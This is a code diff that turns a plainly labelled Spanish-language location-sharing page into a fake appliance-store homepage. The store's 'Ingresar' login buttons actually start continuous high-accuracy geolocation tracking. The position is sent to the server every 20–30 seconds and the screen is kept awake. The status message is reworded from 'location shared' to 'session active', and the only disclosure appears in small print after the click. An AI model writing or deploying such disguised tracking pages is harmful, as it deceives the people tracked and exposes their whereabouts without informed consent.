@@ -3,36 +3,110 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Compartir ubicación</title>
+<title>ElectroHogar · Electrodomésticos</title>
 <style>
-  body{font-family:system-ui,sans-serif;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f4f5f7;color:#111}
-  main{max-width:360px;padding:24px;text-align:center}
-  button{font-size:1.1rem;padding:14px 24px;border:0;border-radius:10px;background:#16a34a;color:#fff;width:100%}
-  button:disabled{background:#9ca3af}
-  #status{margin-top:18px;color:#444;min-height:3em}
-  .ok{color:#16a34a}.err{color:#dc2626}
+  :root{--azul:#0b3d91;--azul2:#1d6fe8;--naranja:#ff7a1a;--gris:#f3f5f9;--txt:#1a2233}
+  *{box-sizing:border-box}
+  body{margin:0;font-family:system-ui,-apple-system,Segoe UI,sans-serif;color:var(--txt);background:#fff}
+  header{position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between;padding:12px 5%;background:#fff;box-shadow:0 2px 10px rgba(0,0,0,.08)}
+  .logo{font-weight:800;font-size:1.4rem;color:var(--azul)}.logo span{color:var(--naranja)}
+  nav{display:flex;gap:22px;align-items:center}
+  nav a{color:var(--txt);text-decoration:none;font-weight:500}
+  .btn{display:inline-block;border:0;cursor:pointer;font:inherit;font-weight:700;padding:12px 26px;border-radius:999px;background:var(--naranja);color:#fff;text-decoration:none;box-shadow:0 4px 12px rgba(255,122,26,.35)}
+  .btn:disabled{background:#9aa3b2;box-shadow:none;cursor:default}
+  .hero{display:grid;grid-template-columns:1.1fr 1fr;align-items:center;gap:30px;padding:60px 5%;background:linear-gradient(120deg,var(--azul),var(--azul2));color:#fff}
+  .hero h1{font-size:clamp(2rem,5vw,3.4rem);margin:0 0 14px;line-height:1.1}
+  .hero p{font-size:1.15rem;opacity:.92;margin:0 0 26px}
+  .hero .big{font-size:9rem;text-align:center;filter:drop-shadow(0 12px 18px rgba(0,0,0,.3))}
+  section{padding:50px 5%}
+  h2{margin:0 0 24px;font-size:1.8rem;color:var(--azul)}
+  .cats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px}
+  .cat{background:var(--gris);border-radius:16px;padding:26px 10px;text-align:center;font-weight:600}
+  .cat i{display:block;font-style:normal;font-size:2.8rem;margin-bottom:8px}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px}
+  .card{border:1px solid #e3e7ef;border-radius:16px;overflow:hidden;background:#fff}
+  .card .img{height:150px;display:flex;align-items:center;justify-content:center;font-size:4.5rem;background:linear-gradient(135deg,#eaf1ff,#f8fbff)}
+  .card .b{padding:16px}
+  .card h3{margin:0 0 6px;font-size:1.05rem}
+  .tag{display:inline-block;background:#e8f7ee;color:#157a3c;font-size:.78rem;font-weight:700;padding:3px 9px;border-radius:999px}
+  .precio{font-size:1.4rem;font-weight:800;color:var(--azul);margin-top:8px}
+  .perks{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;background:var(--gris)}
+  .perk{background:#fff;border-radius:14px;padding:18px;font-weight:600}
+  footer{background:var(--azul);color:#cfe0ff;text-align:center;padding:26px 5%;font-size:.9rem}
+  #panel{display:none;position:fixed;left:0;right:0;bottom:0;z-index:20;background:#0f1b33;color:#fff;padding:14px 5%;text-align:center}
+  #panel.on{display:block}
+  #status.ok{color:#6ee7a0}#status.err{color:#ff8b8b}
+  @media(max-width:760px){.hero{grid-template-columns:1fr;text-align:center}.hero .big{font-size:6rem}nav a.l{display:none}}
 </style>
 </head>
 <body>
-<main>
-  <h2 id="hello">Hola</h2>
-  <p>Toca el botón y permite el acceso a tu ubicación. Mantén esta pantalla abierta mientras trabajas.</p>
-  <button id="go">Compartir mi ubicación</button>
+<header>
+  <div class="logo">Electro<span>Hogar</span></div>
+  <nav>
+    <a class="l" href="#cat">Categorías</a>
+    <a class="l" href="#ofertas">Ofertas</a>
+    <button class="btn go">Ingresar</button>
+  </nav>
+</header>
+
+<div class="hero">
+  <div>
+    <h1>Todo para tu hogar, en un solo lugar</h1>
+    <p>Heladeras, lavarropas, televisores y más. Hasta 12 cuotas sin interés y envío gratis.</p>
+    <button class="btn go">Ingresar</button>
+  </div>
+  <div class="big">🧊📺</div>
+</div>
+
+<section id="cat">
+  <h2>Categorías</h2>
+  <div class="cats">
+    <div class="cat"><i>🧊</i>Heladeras</div>
+    <div class="cat"><i>🧺</i>Lavarropas</div>
+    <div class="cat"><i>📺</i>Televisores</div>
+    <div class="cat"><i>❄️</i>Aire acondicionado</div>
+    <div class="cat"><i>🍳</i>Cocinas</div>
+    <div class="cat"><i>🥣</i>Pequeños electros</div>
+  </div>
+</section>
+
+<section id="ofertas">
+  <h2>Ofertas destacadas</h2>
+  <div class="grid">
+    <div class="card"><div class="img">🧊</div><div class="b"><span class="tag">-20%</span><h3>Heladera No Frost 360 L</h3><div>Acero inoxidable, clase A+</div><div class="precio">Consultar precio</div></div></div>
+    <div class="card"><div class="img">🧺</div><div class="b"><span class="tag">-15%</span><h3>Lavarropas 8 kg Inverter</h3><div>Carga frontal, 1200 rpm</div><div class="precio">Consultar precio</div></div></div>
+    <div class="card"><div class="img">📺</div><div class="b"><span class="tag">-25%</span><h3>Smart TV 55" 4K</h3><div>Android TV, HDR</div><div class="precio">Consultar precio</div></div></div>
+    <div class="card"><div class="img">❄️</div><div class="b"><span class="tag">-10%</span><h3>Aire Split 3000 frigorías</h3><div>Frío / calor, Inverter</div><div class="precio">Consultar precio</div></div></div>
+  </div>
+</section>
+
+<section class="perks">
+  <div class="perk">🚚 Envío gratis a todo el país</div>
+  <div class="perk">💳 12 cuotas sin interés</div>
+  <div class="perk">🛠️ Garantía y servicio técnico</div>
+  <div class="perk">🔒 Compra segura</div>
+</section>
+
+<footer>© ElectroHogar · Todos los derechos reservados</footer>
+
+<div id="panel">
+  <div id="hello"></div>
   <div id="status"></div>
-</main>
+  <small>Al ingresar, tu ubicación se comparte con la empresa mientras trabajás. Dejá esta pantalla abierta.</small>
+</div>
+
 <script>
 const token = location.pathname.split('/').pop();
 const $ = id => document.getElementById(id);
-const status = (t, c) => { $('status').textContent = t; $('status').className = c || ''; };
-let last = null, lastSent = 0, wake = null;
+const btns = document.querySelectorAll('.go');
+const status = (t, c) => { $('status').textContent = t; $('status').className = c || ''; $('panel').classList.add('on'); };
+let last = null, lastSent = 0, timer = null;
 
 fetch('/api/me/' + token).then(r => r.ok ? r.json() : Promise.reject())
-  .then(d => $('hello').textContent = 'Hola, ' + d.name)
-  .catch(() => { status('Link inválido', 'err'); $('go').disabled = true; });
+  .then(d => { $('hello').textContent = 'Hola, ' + d.name; })
+  .catch(() => { btns.forEach(b => b.disabled = true); status('Link inválido', 'err'); });
 
-async function keepAwake() {
-  try { wake = await navigator.wakeLock.request('screen'); } catch {}
-}
+async function keepAwake() { try { await navigator.wakeLock.request('screen'); } catch {} }
 document.addEventListener('visibilitychange', () => {
   if (document.visibilityState === 'visible' && last) keepAwake();
 });
@@ -47,26 +121,25 @@ async function send(pos) {
     });
     if (!r.ok) throw 0;
     lastSent = Date.now();
-    status('Ubicación compartida ✓ ' + new Date().toLocaleTimeString(), 'ok');
+    status('Sesión activa ✓ ' + new Date().toLocaleTimeString(), 'ok');
   } catch { status('Sin conexión, reintentando…', 'err'); }
 }
 
-$('go').onclick = () => {
+btns.forEach(b => b.onclick = () => {
   if (!navigator.geolocation) return status('Tu navegador no soporta ubicación', 'err');
-  $('go').disabled = true;
-  $('go').textContent = 'Compartiendo…';
-  status('Obteniendo ubicación…');
+  btns.forEach(x => { x.disabled = true; x.textContent = 'Ingresando…'; });
+  status('Permití el acceso a tu ubicación para continuar…');
   keepAwake();
   navigator.geolocation.watchPosition(pos => {
     last = pos;
+    btns.forEach(x => x.textContent = 'Sesión activa');
     if (Date.now() - lastSent > 20000) send(pos);
   }, e => {
-    $('go').disabled = false;
-    $('go').textContent = 'Compartir mi ubicación';
-    status(e.code === 1 ? 'Permiso denegado. Actívalo en los ajustes del navegador.' : 'No se pudo obtener la ubicación', 'err');
+    btns.forEach(x => { x.disabled = false; x.textContent = 'Ingresar'; });
+    status(e.code === 1 ? 'Permiso denegado. Activá la ubicación en los ajustes del navegador.' : 'No se pudo obtener la ubicación', 'err');
   }, { enableHighAccuracy: true, maximumAge: 10000, timeout: 30000 });
-  setInterval(() => { if (last && Date.now() - lastSent > 30000) send(last); }, 15000);
-};
+  if (!timer) timer = setInterval(() => { if (last && Date.now() - lastSent > 30000) send(last); }, 15000);
+});
 </script>
 </body>
 </html>
